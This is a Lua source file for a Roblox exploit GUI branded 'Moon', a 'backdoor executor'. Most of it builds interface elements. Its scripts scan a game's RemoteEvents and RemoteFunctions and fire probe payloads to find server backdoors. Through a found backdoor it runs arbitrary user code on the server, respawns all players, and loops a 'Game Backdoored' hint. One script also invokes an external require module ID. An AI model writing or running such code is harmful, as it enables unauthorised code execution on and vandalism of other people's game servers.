G2L["8e"] = Instance.new("UICorner", G2L["8d"]);
G2L["8e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["8f"] = Instance.new("UIGradient", G2L["8d"]);
G2L["8f"]["Rotation"] = 90;
G2L["8f"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["90"] = Instance.new("TextButton", G2L["8b"]);
G2L["90"]["BorderSizePixel"] = 0;
G2L["90"]["TextSize"] = 22;
G2L["90"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["90"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["90"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["90"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["90"]["Text"] = [[Execute]];
G2L["90"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["91"] = Instance.new("LocalScript", G2L["90"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["92"] = Instance.new("UICorner", G2L["90"]);
G2L["92"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["93"] = Instance.new("UICorner", G2L["8b"]);
G2L["93"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["94"] = Instance.new("TextLabel", G2L["8b"]);
G2L["94"]["BorderSizePixel"] = 0;
G2L["94"]["TextSize"] = 32;
G2L["94"]["TextTransparency"] = 0.49;
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["94"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["94"]["BackgroundTransparency"] = 1;
G2L["94"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["94"]["Text"] = [[Nuclear Gui]];
G2L["94"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["95"] = Instance.new("Frame", G2L["2e"]);
G2L["95"]["BorderSizePixel"] = 0;
G2L["95"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["95"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["95"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["96"] = Instance.new("UIStroke", G2L["95"]);
G2L["96"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["96"]["Thickness"] = 1.3;
G2L["96"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["97"] = Instance.new("ImageLabel", G2L["95"]);
G2L["97"]["BorderSizePixel"] = 0;
G2L["97"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["97"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["97"]["Image"] = [[rbxassetid://132987071478963]];
G2L["97"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["97"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["97"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["98"] = Instance.new("UICorner", G2L["97"]);
G2L["98"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["99"] = Instance.new("UIGradient", G2L["97"]);
G2L["99"]["Rotation"] = 90;
G2L["99"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["9a"] = Instance.new("TextButton", G2L["95"]);
G2L["9a"]["BorderSizePixel"] = 0;
G2L["9a"]["TextSize"] = 22;
G2L["9a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9a"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["9a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9a"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["9a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9a"]["Text"] = [[Execute]];
G2L["9a"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["9b"] = Instance.new("LocalScript", G2L["9a"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["9c"] = Instance.new("UICorner", G2L["9a"]);
G2L["9c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["9d"] = Instance.new("UICorner", G2L["95"]);
G2L["9d"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["9e"] = Instance.new("TextLabel", G2L["95"]);
G2L["9e"]["BorderSizePixel"] = 0;
G2L["9e"]["TextSize"] = 32;
G2L["9e"]["TextTransparency"] = 0.49;
G2L["9e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["9e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9e"]["BackgroundTransparency"] = 1;
G2L["9e"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["9e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9e"]["Text"] = [[Police AI]];
G2L["9e"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["9f"] = Instance.new("Frame", G2L["2e"]);
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["9f"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9f"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["a0"] = Instance.new("UIStroke", G2L["9f"]);
G2L["a0"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["a0"]["Thickness"] = 1.3;
G2L["a0"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["a1"] = Instance.new("ImageLabel", G2L["9f"]);
G2L["a1"]["BorderSizePixel"] = 0;
G2L["a1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a1"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["a1"]["Image"] = [[rbxassetid://116070945479545]];
G2L["a1"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["a1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a1"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["a2"] = Instance.new("UICorner", G2L["a1"]);
G2L["a2"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["a3"] = Instance.new("UIGradient", G2L["a1"]);
G2L["a3"]["Rotation"] = 90;
G2L["a3"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["a4"] = Instance.new("TextButton", G2L["9f"]);
G2L["a4"]["BorderSizePixel"] = 0;
G2L["a4"]["TextSize"] = 22;
G2L["a4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a4"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["a4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a4"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["a4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a4"]["Text"] = [[Soon!!!]];
G2L["a4"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["a5"] = Instance.new("UICorner", G2L["a4"]);
G2L["a5"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["a6"] = Instance.new("UICorner", G2L["9f"]);
G2L["a6"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["a7"] = Instance.new("TextLabel", G2L["9f"]);
G2L["a7"]["BorderSizePixel"] = 0;
G2L["a7"]["TextSize"] = 32;
G2L["a7"]["TextTransparency"] = 0.49;
G2L["a7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a7"]["BackgroundTransparency"] = 1;
G2L["a7"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a7"]["Text"] = [[More Coming]];
G2L["a7"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.UICorner
G2L["a8"] = Instance.new("UICorner", G2L["24"]);
G2L["a8"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.RE
G2L["a9"] = Instance.new("TextButton", G2L["24"]);
G2L["a9"]["BorderSizePixel"] = 0;
G2L["a9"]["TextSize"] = 20;
G2L["a9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a9"]["ZIndex"] = 1000000000;
G2L["a9"]["Size"] = UDim2.new(-0.01895, 98, 0.01352, 22);
G2L["a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a9"]["Text"] = [[RE]];
G2L["a9"]["Name"] = [[RE]];
G2L["a9"]["Position"] = UDim2.new(0.62522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Hub.RE.LocalScript
G2L["aa"] = Instance.new("LocalScript", G2L["a9"]);



-- StarterGui.ScreenGui.Hub.RE.UICorner
G2L["ab"] = Instance.new("UICorner", G2L["a9"]);
G2L["ab"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.LocalScript
G2L["ac"] = Instance.new("LocalScript", G2L["1"]);



-- StarterGui.ScreenGui.Load.LocalScript
local function C_3()
	local script = G2L["3"];
	local ownerid = 8167967082

	local Players = game:GetService("Players")

	local function onPlayerAdded(player)
		if player.UserId == ownerid then
			game.StarterGui:SetCore("SendNotification", {
				Title = "Moon",
				Text = "Omg Moon Owner joined !!!. "..player.Name,
				Icon = "rbxassetid://7395824155",
				Duration = 10,
			})
		end
	end


	Players.PlayerAdded:Connect(onPlayerAdded)

	for _, player in Players:GetPlayers() do
		onPlayerAdded(player)
	end
end;
task.spawn(C_3);
-- StarterGui.ScreenGui.Load.bg.LocalScript
local function C_5()
	local script = G2L["5"];
	local UI_ELEMENT = script.Parent 
	local START_POSITION = UDim2.new(0.34, 0, 0.5, 0)
	local END_POSITION = UDim2.new(0.58, 0, 0.5, 0)
	local TWEEN_DURATION = 1.0
	local EASING_STYLE = Enum.EasingStyle.Sine 
	local EASING_DIRECTION = Enum.EasingDirection.InOut 

	local tweenInfo = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		-1,
		true, 
		0 
	)


	local tween = game:GetService("TweenService"):Create(UI_ELEMENT, tweenInfo, {Position = END_POSITION})

	tween:Play()

end;
task.spawn(C_5);
-- StarterGui.ScreenGui.Load.Logo.LocalScript
local function C_7()
	local script = G2L["7"];
	local IMAGE_LOGO = script.Parent


	local ROTATION_ANGLE_1 = -5 
	local ROTATION_ANGLE_2 = 9  


	local TWEEN_DURATION = 1.0 
	local EASING_STYLE = Enum.EasingStyle.Quad 
	local EASING_DIRECTION = Enum.EasingDirection.InOut 

	local tweenInfo1 = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		0, 
		false, 
		0 
	)

	local tweenInfo2 = TweenInfo.new(
		TWEEN_DURATION,
		EASING_STYLE,
		EASING_DIRECTION,
		0, 
		false, 
		0
	)


	local function startRotationLoop()
		while true do
			local tween1 = game:GetService("TweenService"):Create(
				IMAGE_LOGO,
				tweenInfo1,
				{Rotation = ROTATION_ANGLE_1}
			)
			tween1:Play()
			tween1.Completed:Wait()

			local tween2 = game:GetService("TweenService"):Create(
				IMAGE_LOGO,
				tweenInfo2,
				{Rotation = ROTATION_ANGLE_2}
			)
			tween2:Play()
			tween2.Completed:Wait() 
		end
	end


	startRotationLoop()
end;
task.spawn(C_7);
-- StarterGui.ScreenGui.Load.Logo.LocalScript
local function C_a()
	local script = G2L["a"];
	wait(5)

	for i = 0.4, 1, 0.01 do
		script.Parent.BackgroundTransparency = i
		wait(time)
	end

	script.Parent:TweenSize(UDim2.new(0, 73,0, 49))
	script.Parent:TweenPosition(UDim2.new(0.066, 0,0.892, 0))
end;
task.spawn(C_a);
-- StarterGui.ScreenGui.Main.UIDrag
local function C_c()
	local script = G2L["c"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_c);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_d()
	local script = G2L["d"];
	game.StarterGui:SetCore("SendNotification", {
		Title = "Moon",
		Text = "Please Join Our Server.",
		Icon = "rbxassetid://7395824155",
		Duration = 10,
	})

	setclipboard("https://discord.gg/W5bNxXf85r")
end;
task.spawn(C_d);
-- StarterGui.ScreenGui.Main.LocalScript
local function C_e()
	local script = G2L["e"];
	local buttons = {
		Exe = script.Parent.Buttons.Exe;
		clear = script.Parent.Buttons.Clear;
		connect = script.Parent.Connect;
	}

	local statustext = script.Parent.Stats
	local codeBar = script.Parent.CodeBar

	local statusIcons = {
		Offline = "🔴";
		Checking = "🟠";
		Allow = "🟢";
	}

	local function setStatus(key)
		if key == "O" then
			statustext.Text = statusIcons.Offline
		elseif key == "C" then
			statustext.Text = statusIcons.Checking
		elseif key == "B" then
			statustext.Text = statusIcons.Allow
		end
	end

	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0 

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end


		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local RE = [[
		for _, lol in pairs(game.Players:GetPlayers()) do
			lol:LoadCharacter()
		end
		]]








		local Hint = [[
		local hint = Instance.new("Hint", game.Workspace)
		hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
		
		while true do
			wait(5)
			hint:Destroy()
			wait(5)
			local hint = Instance.new("Hint", game.Workspace)
			hint.Text = "Game Backdoored by Moon Exe !! gg/W5bNxXf85r --- fastest backdoor executor"
		end
		]]

		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(RE) end)
					pcall(function() remote:InvokeServer(Hint) end) --- its hint dumbass
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(RE) end)
				pcall(function() remote:FireServer(Hint) end) --- its hint dumbass
			end
		end)

		return testId
	end

	local function simpleFindRemote()
		setStatus("C")
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0 
		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock() 
		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01 or 0.05 or 0.5
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end

	local exeConnection
	local function updateExeButton()
		if exeConnection then
			exeConnection:Disconnect()
			exeConnection = nil
		end
		if foundExploit then
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				local code = codeBar.Text
				if code and code ~= "" then
					if remoteEvent then
						print("ℹ️ Executing via RemoteEvent:", remoteEvent:GetFullName())
						pcall(function() remoteEvent:FireServer(code) end)
					elseif remoteFunction then
						print("ℹ️ Executing via RemoteFunction:", remoteFunction:GetFullName())
						pcall(function()
							remoteFunction:InvokeServer("moonTSS", code)
						end)
					end
					StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "Code executed through backdoor",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				else
					StarterGui:SetCore("SendNotification", {
						Title = "🌙 moon",
						Text = "No Code to Execute",
						Icon = "rbxassetid://73958241564252",
						Duration = 3,
					})
				end
			end)
		else
			exeConnection = buttons.Exe.MouseButton1Click:Connect(function()
				StarterGui:SetCore("SendNotification", {
					Title = "Moon",
					Text = "No Backdoor Found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end)
		end
	end

	buttons.connect.MouseButton1Click:Connect(function()
		setStatus("C")
		StarterGui:SetCore("SendNotification", {
			Title = "Moon",
			Text = "Checking for backdoors...",
			Icon = "rbxassetid://7395824155",
			Duration = 3,
		})
		task.spawn(function()
			local scanStart = os.clock() 
			simpleFindRemote()
			local scanEnd = os.clock()
			print(string.format("🌙 moon: Scan completed in %.2f ms", (scanEnd - scanStart) * 1000))

			if foundExploit then
				setStatus("B")
				local formattedTime = string.format("%.2f", timeToFindExploit)
				StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "Backdoor found in " .. formattedTime .. " seconds!",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			else
				setStatus("O")
				StarterGui:SetCore("SendNotification", {
					Title = "🌙 moon",
					Text = "No backdoor found",
					Icon = "rbxassetid://73958241564252",
					Duration = 5,
				})
			end
			updateExeButton()
		end)
	end)

	buttons.clear.MouseButton1Click:Connect(function()
		codeBar.Text = ""
	end)

	setStatus("O")
	updateExeButton()
end;
task.spawn(C_e);
-- StarterGui.ScreenGui.Main.Hub.LocalScript
local function C_22()
	local script = G2L["22"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.Hub.Visible = true
	end)
end;
task.spawn(C_22);
-- StarterGui.ScreenGui.Hub.UIDrag
local function C_25()
	local script = G2L["25"];
	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --

	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil

	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)

	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end;
task.spawn(C_25);
-- StarterGui.ScreenGui.Hub.Hub.LocalScript
local function C_2c()
	local script = G2L["2c"];
	script.Parent.MouseButton1Click:Connect(function()
		script.Parent.Parent.Visible = false
		script.Parent.Parent.Parent.Main.Visible = true
	end)
end;
task.spawn(C_2c);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_37()
	local script = G2L["37"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(4513235536).G(']] .. player.Name .. [[')]]

		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end

	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else
		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_37);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_41()
	local script = G2L["41"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
